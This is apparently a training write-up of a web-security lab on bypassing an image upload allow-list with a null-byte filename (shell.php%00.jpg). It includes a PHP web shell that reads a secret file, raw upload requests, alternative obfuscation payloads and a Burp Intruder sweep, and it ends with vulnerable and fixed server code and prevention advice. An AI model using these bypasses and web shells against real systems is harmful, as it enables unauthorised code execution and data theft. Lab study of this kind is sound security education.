# File Upload Vulnerabilities - Lab #5: Web Shell Upload via Obfuscated File Extension

**YouTube Tutorial:** [File Upload Vulnerabilities - Lab #5 Web shell upload via obfuscated file extension](https://youtu.be/c_NT4lIaNuA?si=CYlhYAwG0hoKjg62)

---

## 1. What is an Obfuscated File Extension Bypass?

### Core Concept

This lab flips the previous lab's approach on its head. Instead of a blacklist that rejects known-dangerous extensions, this app runs an **allow-list**: it only accepts files ending in `.jpg` or `.png`, and rejects everything else, including `shell.php`. On paper, allow-lists are supposed to be the "correct," robust version of this kind of check — but this one still has a fatal weak point: it checks the filename string you *submit*, not the filename the server actually ends up *using* once processing is complete. If there's any gap between "what the validation code reads" and "what the file-saving code reads," that gap is exploitable.

The specific gap here is a classic, decades-old trick: the **null byte**. In many lower-level programming languages and C-based string-handling routines, a null byte (`\x00`) marks the literal end of a string — anything after it is simply ignored by functions that operate at that level, even if the string, as far as a higher-level language like PHP is concerned, keeps going. So if the validation logic checks the *whole* filename string (`exploit.php\x00.jpg`, which ends in `.jpg` — passes!), but the underlying file-saving operation uses a lower-level function that stops reading at the null byte, the file actually gets saved as `exploit.php`, extension and all, with everything from the null byte onward silently discarded.

```
┌─────────────────────────────┐        ┌─────────────────────────────┐
│   WHAT THE VALIDATOR SEES    │        │   WHAT THE FILESYSTEM SEES   │
├─────────────────────────────┤        ├─────────────────────────────┤
│ filename:                    │        │ Same submitted filename,     │
│ "exploit.php%00.jpg"         │        │ but the null byte marks      │
│                               │        │ where a lower-level string   │
│ Ends in ".jpg" → looks like  │        │ function stops reading       │
│ a valid image → PASSES       │        │                               │
└───────────────┬─────────────┘        └───────────────┬─────────────┘
                │                                       │
                ▼                                       ▼
┌─────────────────────────────┐        ┌─────────────────────────────┐
│ Validation logic is happy,   │        │ File is actually WRITTEN     │
│ lets the upload proceed      │        │ to disk as just:             │
│                               │        │ exploit.php                  │
│                               │        │ (".jpg" was truncated away)  │
└─────────────────────────────┘        └───────────────┬─────────────┘
                                                         │
                                                         ▼
                                        ┌─────────────────────────────┐
                                        │ Visiting exploit.php's URL   │
                                        │ runs it as real PHP code     │
                                        │ = Remote Code Execution ✅   │
                                        └─────────────────────────────┘
```

The oracle here is the mismatch between two different layers of the application disagreeing about where a filename "ends" — one reads the full string, one stops at a special character buried inside it.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`.

* **Provided Credentials:** `wiener:peter`
* **What Changed From Earlier Labs:** Uploading `shell.php` is rejected with a message specifically saying only JPG and PNG files are allowed — a strict allow-list, not a blacklist this time.
* **The Bypass:** A URL-encoded null byte inserted between the real extension and a fake, allowed one, exploiting a mismatch in how different layers of the server parse the filename string.
* **End Goal:** Get PHP code executing on the server, use it to read `/home/carlos/secret`, and submit the contents.

### Root Cause & Impact

The root cause is that filename validation and file storage are, once again, two separate pieces of logic that don't fully agree on how to interpret the exact same input string. The validation check (likely written in PHP, operating on the full string) sees `exploit.php%00.jpg`, correctly decodes the null byte, and — because it's checking whether the string *ends* in `.jpg` — is satisfied. But whatever underlying mechanism actually writes the file to disk stops interpreting the string the moment it hits that null byte, producing a file genuinely named `exploit.php`. Any system where request parsing, validation, and file-writing happen at different abstraction levels (a common, realistic architecture) is a candidate for this exact category of inconsistency.

---

## 3. Attack Methods & Techniques (What I Tried, and What Actually Worked)

**First move — the standard shell, unmodified.** Uploading `shell.php` directly, same as always. Immediately rejected, with an explicit message: only JPG and PNG files are allowed. This is a stricter, allow-list-style message compared to Lab #4's blacklist rejection — worth noting, since it changes which bypass techniques are worth trying.

**Trying the simplest possible dodge — just append a fake extension.** Renaming the file to `shell.php.jpg` and re-uploading. This actually gets accepted by the validator (it ends in `.jpg`, after all) — but visiting the resulting file's URL just shows the raw PHP source as plain text, not executed output. The file was genuinely saved with the full `.php.jpg` double extension intact, and no web server configuration treats `.php.jpg` as PHP. Dead end, but a useful one — it confirms the filter really is just checking the end of the string, nothing smarter than that.

**Trying alternate capitalization, in case the check is case-sensitive.** Testing `shell.PHP.jpg`, `shell.pHp`, and similar variants. None of these change the outcome meaningfully — either still rejected, or accepted but not executable, same as the plain double-extension attempt.

**Trying a trailing space or dot before the fake extension.** Some older write-ups of similar labs mention trailing-space or trailing-dot filesystem quirks on certain OS/webserver combinations. Testing `shell.php .jpg` (with a literal space) and `shell.php.` doesn't produce a working result here either — this particular lab's specific bypass is something else.

**The actual technique — inserting a null byte.** Going back to `shell.php.jpg`, but this time inserting a URL-encoded null byte (`%00`) directly between the real extension and the fake one: `shell.php%00.jpg`. Sending this through Burp Repeater (editing the raw `filename` field in the multipart body, since a browser's normal file picker won't let you type a null byte into a filename).

**It works — but not exactly as expected.** The upload succeeds, and interestingly, the server's own success message refers to the file simply as `shell.php` — no trace of the null byte or the `.jpg` suffix remains, confirming both were stripped away by whatever process actually wrote the file to disk. Visiting `/files/avatars/shell.php` (not `shell.php%00.jpg`, not `shell.php.jpg` — just the clean, truncated name) executes the code successfully.

### Server Behavior

* **Uploading `shell.php` directly:** Rejected — "only JPG and PNG files are allowed."
* **Uploading `shell.php.jpg` (plain double extension, no null byte):** Accepted, but stored with the full double extension intact — visiting its URL shows raw PHP source, not executed output.
* **Uploading `shell.php%00.jpg` (null byte inserted before the fake extension):** Accepted, and the server's own confirmation message reports the stored filename as just `shell.php` — confirming the null byte and everything after it were truncated away during storage.
* **Requesting `/files/avatars/shell.php` (the truncated name) directly:** Executes as PHP, returning the contents of `/home/carlos/secret`.

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm the Allow-List Rejects PHP Directly

1. Log in with `wiener:peter` and go to **"My account."**
2. Create a file named `shell.php` containing:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Attempt to upload it.
4. **Observation:** The upload is rejected with a message indicating only JPG and PNG files are accepted — a stricter, allow-list-style check compared to earlier labs.

### Step 2: Capture the Upload Request in Burp

1. Turn on Burp Proxy interception, or find the upload attempt in **Proxy → HTTP history**.
2. Send the `POST /my-account/avatar` request to **Burp Repeater**.
3. Locate the `filename` field within the multipart body:

```http
------WebKitFormBoundary...
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary...
```

### Step 3: Confirm the Plain Double-Extension Trick Doesn't Achieve Execution

1. Change the `filename` value to `shell.php.jpg`.
2. Send the request.
3. **Result:** Upload succeeds, but requesting the resulting file's URL shows the raw PHP source as text — no execution occurred. This confirms the filter checks the string's ending correctly, and no server misconfiguration treats `.php.jpg` as executable on its own.

### Step 4: Insert a URL-Encoded Null Byte

1. In Burp Repeater, change the `filename` value to include a URL-encoded null byte between the two extensions:

```http
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
```

2. Send the request.
3. **Result:** The upload succeeds, and the server's own confirmation message describes the file as `avatars/shell.php` — with no trace of the null byte or `.jpg` suffix. This confirms the null byte and everything following it were truncated away by the time the file was actually written to disk.

### Step 5: Request the Truncated Filename Directly

1. Since the file was actually saved as `shell.php` (not `shell.php%00.jpg` and not `shell.php.jpg`), construct the request accordingly:

```http
GET /files/avatars/shell.php HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

2. Send this request directly, either in your browser or via Burp Repeater.
3. **Result:** The response contains the output of the executed PHP code — the contents of `/home/carlos/secret`.

### Step 6: Submit the Solution

1. Copy the secret string from the response.
2. Click the lab banner's **"Submit solution"** button, paste the secret, and submit.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Different Ways to Exploit This (Alternative Methods & Payloads)

**Semicolon-based truncation, a technique historically effective against certain server-side languages (especially older Java/ASP-style parsers):**

```
shell.php;.jpg
shell.asp;.jpg
```

Some frameworks historically stopped parsing a filename's extension at the first semicolon, treating everything before it as the "real" extension while still satisfying a naive suffix check — worth trying as an alternative to the null byte if that specific technique doesn't work on a given target.

**Multibyte Unicode character tricks, for targets that perform Unicode normalization somewhere in the pipeline:**

```
shell.phpU+FF0E.jpg  (fullwidth period, may normalize to a regular dot)
```

Sequences like overlong UTF-8 encodings of a dot or slash character can sometimes be converted into their ASCII equivalents at a different stage of processing than where the validation check runs, causing the same kind of "what's validated isn't what's stored" mismatch as the null byte trick — a more obscure but occasionally effective technique against internationalized applications.

**Automating a broad sweep of obfuscation techniques with Burp Intruder, rather than manually testing one at a time:**

1. Send the upload request to **Intruder**.
2. Mark a payload position right after `shell.php` and before `.jpg` in the `filename` field, e.g. `shell.php§§.jpg`.
3. Under **Payloads**, load a wordlist of common obfuscation separators: `%00`, `;`, `%20`, `.`, `%0a`, `%0d%0a`, and various Unicode dot/slash sequences.
4. Under **Payload encoding**, make sure Burp isn't double-URL-encoding your payloads (uncheck "URL-encode these characters" if your payload list already contains encoded values like `%00`).
5. Launch the attack and compare response lengths/status codes to spot which separator(s) get accepted and produce a differently-named stored file.

**Checking whether the truncation behavior differs for the Content-Type header too, not just the filename:**

Some validation logic checks both the filename extension and the `Content-Type` header independently — if only the filename is vulnerable to null-byte truncation but the Content-Type is checked separately and stricter, you may need to combine this technique with Lab #2's Content-Type spoofing (`image/jpeg`) at the same time for the upload to succeed at all.

**If null-byte truncation doesn't work but double extensions are accepted onto disk (as in Step 3), check whether *any* directory-level configuration would still execute the double-extension file** — some Apache configurations using `AddHandler` (rather than `AddType`) will execute any file with `.php` appearing *anywhere* in its name, including `shell.php.jpg`, due to a known Apache multiple-extension quirk — worth testing directly even without any obfuscation trick, on real-world targets specifically.

---

## 6. If This Existed in the Real World

Null byte injection is one of the most storied vulnerability classes in real-world web application history, precisely because it exploits a fundamental gap between how high-level and low-level languages handle strings:

* **PHP itself, prior to version 5.3.4, was natively vulnerable to null byte truncation** in many of its own file-handling functions, because PHP's string functions were built on top of C's null-terminated string convention. This meant that for years, *any* PHP application performing filename validation in PHP but ultimately relying on the underlying C library for file operations was potentially vulnerable to exactly this technique, without the application developers doing anything wrong beyond simply using PHP as it existed at the time.
* **Countless CVEs across a wide range of software** — not just web applications, but also standalone desktop and server software written in C, C++, and older Java code — have been filed for null byte injection in path/filename validation, log injection, and authentication bypass contexts, making this one of the most cross-cutting, historically significant vulnerability patterns in application security.
* **Modern frameworks generally patch this at the language/runtime level now** (which is why this lab needs to specifically construct an older-style vulnerable scenario to teach the concept) — but the *underlying lesson*, that validation and actual usage of a value can diverge if they're implemented using different parsing logic, remains extremely relevant, and shows up in modern equivalents involving Unicode normalization, differing regex engines, or inconsistent encoding/decoding order between layers of a system.

---

## 7. Pro-Tips & Common Pitfalls

* **Your browser's file picker won't let you type a null byte into a filename — you have to edit the raw request.** This is why Burp Repeater (or any raw HTTP request editor) is essential for this lab; there's no way to achieve this bypass purely through the upload form's UI.
* **Always check what filename the server's own success message reports back.** As with the path traversal lab, the server frequently tells you exactly what actually happened to your input — in this case, confirming the null byte truncation worked by showing `shell.php`, not the full string you submitted. Don't assume; verify from the response.
* **A successful upload doesn't necessarily mean successful execution — always check both.** The plain double-extension attempt (Step 3) is a perfect example: it uploads fine, but produces a file that isn't executable at all. Treat "upload accepted" and "code executes" as two entirely separate things to verify.
* **This technique is version/configuration-dependent — know when it won't apply.** Since modern PHP versions patched null byte handling in their own string functions, this specific bypass mainly matters against older stacks or non-PHP languages/frameworks with similar underlying C-based string handling — worth confirming target technology and version where possible in a real assessment, rather than assuming this technique will always work.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — validation checks the full filename string (correctly
// decoding the null byte first), but the underlying file-write operation
// uses a lower-level function that truncates at the null byte
$filename = urldecode($_FILES['avatar']['name']); // "exploit.php\x00.jpg"
if (!preg_match('/\.(jpg|png)$/', $filename)) { // ends in ".jpg" → passes!
    die('Only JPG and PNG files are allowed');
}
// underlying C-based file write function stops at \x00 → saves as "exploit.php"
move_uploaded_file($_FILES['avatar']['tmp_name'], "/var/www/files/avatars/" . $filename);

// ✅ SAFE — reject filenames containing null bytes (or any non-printable
// character) outright, and never trust a suffix-only check as sufficient
if (strpos($filename, "\x00") !== false) {
    die('Invalid filename');
}
$safeFilename = generateRandomFilename() . '.jpg'; // ignore submitted filename entirely
move_uploaded_file($_FILES['avatar']['tmp_name'], "/var/www/files/avatars/" . $safeFilename);
```

* **Prevention summary:**
  * Reject any filename containing null bytes or other non-printable control characters outright, before any further validation logic runs.
  * Ensure validation and file-storage logic operate on the exact same, canonically-processed string — never let one layer decode/interpret the filename differently than another.
  * Prefer generating an entirely new, safe filename server-side over trying to sanitize or validate a client-supplied one — this sidesteps the entire category of "different layers disagree about the filename" bugs, including this one.
  * Keep underlying language runtimes and libraries patched — many of these classic truncation bugs were fixed at the platform level over time, and staying current closes off entire categories of this attack without needing bespoke application-level defenses.